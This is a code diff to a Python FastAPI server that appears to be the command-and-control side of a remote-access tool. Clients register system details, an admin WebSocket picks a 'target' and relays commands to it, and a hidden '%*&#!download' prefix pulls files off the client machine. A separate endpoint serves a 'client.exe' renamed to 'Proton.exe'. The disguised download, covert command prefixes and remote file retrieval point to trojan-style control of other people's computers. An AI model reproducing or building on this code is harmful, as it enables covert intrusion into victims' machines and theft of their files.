@@ -2,16 +2,19 @@ import asyncio
 import os
 import pprint
 import time
+import traceback
 
 import starlette
 from fastapi import FastAPI, WebSocket, HTTPException
+from sqlmodel import Session
 # from fastapi.security import APIKeyHeader
 from starlette.middleware.cors import CORSMiddleware
+from starlette.responses import FileResponse
 from starlette.websockets import WebSocketDisconnect
 
 import utils
 from database import crud
-from database.db import create_db_and_tables
+from database.db import create_db_and_tables, get_db
 
 # app
 app = FastAPI(
@@ -32,6 +35,7 @@ app.add_middleware(
 # Store connected clients
 clients = {}  # {client_id: websocket}
 admin_websocket = None
+admin_interacting_with = 0
 
 
 async def select_client_to_interact_with(websocket: WebSocket):
@@ -99,6 +103,41 @@ async def handle_client_interaction(client_websocket: WebSocket, admin_websocket
         return False
 
 
+@app.websocket("/ws/test")
+async def websocket_endpoint_client(websocket: WebSocket):
+    await websocket.accept()
+    client_id = len(clients) + 1
+    clients[client_id] = {"ws": websocket}
+    try:
+        get_username = await websocket.receive_text()
+        if get_username.lower().startswith(".%."):
+            client_data = await websocket.receive_json()
+            clients[client_id]["client_data"] = client_data
+            print(client_data)
+
+        while True:
+            client_data = await websocket.receive_text()
+
+            if client_data.lower().startswith('%*&#!download'):
+                print("receive file")
+                _, filename = client_data.split(' ', 1)
+                # Use asyncio to concurrently receive file in the background
+                response = await asyncio.create_task(utils.receive_file(websocket, filename))
+                await admin_websocket.send_json({"client": client_id, "response": str(response)})
+                continue
+
+    except WebSocketDisconnect:
+        print("test Disconnected")
+
+
+@app.get("/download")
+def download_file():
+    file_path = "./chield/client.exe"
+    if os.path.exists(file_path):
+        return FileResponse(file_path, media_type='application/octet-stream', filename="Proton.exe")
+    return {"error": "File not found"}
+
+
 @app.websocket("/ws/parent")
 async def websocket_endpoint_client(websocket: WebSocket):
     global admin_websocket
@@ -110,18 +149,12 @@ async def websocket_endpoint_client(websocket: WebSocket):
             await websocket.send_text(cmd)
             proton_status = await websocket.receive_text()
             print(proton_status)
+            proton_status = await websocket.receive_text()
+            print(proton_status)
             await websocket.close(code=1000)  # Close the WebSocket connection gracefully
             return
         try:
-            file_data = b"<SOF>"
-            try:
-                filepath = "./auth_socket_logic/server.crt"
-                with open(filepath, 'rb') as file:
-                    file_data = file.read()
-                    await websocket.send_bytes(file_data)
-            except FileNotFoundError:
-                await websocket.send_bytes(b'%-> Not found')
-            # await websocket.send_text("1")
+            await websocket.send_text("config_proton")
             parent_replay = await websocket.receive_text()
             first_time = True
             try:
@@ -188,12 +221,18 @@ async def websocket_endpoint_client(websocket: WebSocket):
 
             await admin_websocket.send_json({"client": client_id, "response": client_data})
     except:
-        del clients[client_id]
+        if admin_interacting_with == client_id:
+            del clients[client_id]
+            await admin_websocket.send_json({"client": client_id, "response": "Disconnected"})
+        else:
+            del clients[client_id]
 
 
 @app.websocket("/ws-remote-access/admin")
 async def websocket_endpoint(websocket: WebSocket, api_key: str | None, client_id: int | None):
     global admin_websocket
+    global admin_interacting_with
+    admin_interacting_with = client_id
     admin_websocket = websocket
     await websocket.accept()
     max_client_id = len(clients)
@@ -201,7 +240,6 @@ async def websocket_endpoint(websocket: WebSocket, api_key: str | None, client_i
         await websocket.send_text(
             "Please provide a valid client_id to connect with \nFind details: https://192.168.88.58:8000/get-clients")
         await admin_websocket.close(code=1000)  # Close the WebSocket connection gracefully
-        return
     if await utils.is_client_admin(api_key):
         switched = False
         try:
@@ -236,8 +274,9 @@ async def get_clients():
             client_ws = client_info["ws"]
             # Create a dictionary to hold client information
             client_data = client_info.get("client_data", {})
+            db: Session = get_db()
 
-            db_registered_pc = crud.add_target_pc(client_data)
+            db_registered_pc = crud.get_registered_pc_by_sys_uuid(db, client_data['system_uuid'])
             if db_registered_pc.username_changed:
                 client_data["username"] = db_registered_pc.updated_username
             else:
@@ -247,7 +286,8 @@ async def get_clients():
                 "client_id": client_id,
                 "address": f"{client_ws.client.host}:{client_ws.client.port}",
                 "username": client_data['username'],
-                "system_uuid": client_data['system_uuid']
+                "system_uuid": client_data['system_uuid'],
+                'users': db_registered_pc.users
             }
             message["clients"].append(client_info)
 
@@ -282,7 +322,7 @@ if __name__ == "__main__":
     create_db_and_tables()
     import uvicorn
 
-    uvicorn.run(app, host="127.0.0.1", port=8000, ssl_keyfile='./server.key',
+    uvicorn.run(app, host="192.168.88.70", port=8000, ssl_keyfile='./server.key',
                 ssl_certfile='./server.crt',
                 log_level="info")
 
